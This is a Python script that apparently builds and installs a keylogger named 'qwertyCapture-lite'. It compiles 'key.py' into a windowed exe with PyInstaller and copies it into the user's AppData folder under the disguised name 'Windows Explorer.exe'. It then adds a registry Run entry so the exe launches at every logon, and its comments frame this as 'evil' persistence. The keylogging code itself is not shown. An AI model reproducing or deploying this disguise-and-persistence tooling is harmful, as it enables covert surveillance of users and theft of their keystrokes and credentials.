import sys
import os
import shutil
import subprocess
from colorama import Fore, Style
import pyfiglet as pyg  


res= pyg.figlet_format("qwertyCapture-lite")
print(Fore.YELLOW + res)  
print(Fore.MAGENTA +  "\n\nAuthor:\thail0hydra")
print(Style.RESET_ALL)

def create_exe():
    # Create .exe file using PyInstaller ✅
    sys.argv.append('pyinstaller')
    sys.argv.append('--onefile')
    sys.argv.append('--windowed')
    sys.argv.append('--icon=crate/we.ico')
    sys.argv.append('key.py')

    try:
        subprocess.run(['pyinstaller'] + sys.argv[2:], check=True)
        print(Fore.GREEN + "Exe crafted successfully")
        print(Style.RESET_ALL)
    except subprocess.CalledProcessError:
        print(Fore.RED + "Failed to create exe")
        print(Style.RESET_ALL)

def add_to_hkcu():

    # Add key.exe to HKCU hive for persistance 😏
    evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(evil_file_location):
        exe_path = os.path.join(os.getcwd(), 'dist', 'key.exe')
        shutil.copyfile(exe_path, evil_file_location)
        
        # for startup addition
        print(Fore.RED + "\n\n\n\nExe Path is: ", exe_path, "\n\n\n\nevil_file_location is: ", evil_file_location, "\n\n\n\n")
        print(Style.RESET_ALL)

        try:
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
            print(Fore.GREEN + "Exe added to HKCU hive successfully")
            print(Style.RESET_ALL)

        except subprocess.CalledProcessError:
            print(Fore.RED + "Failed to add exe to HKCU hive")
            print(Style.RESET_ALL)

def main():
    create_exe()
    add_to_hkcu()

if __name__ == "__main__":
    main()
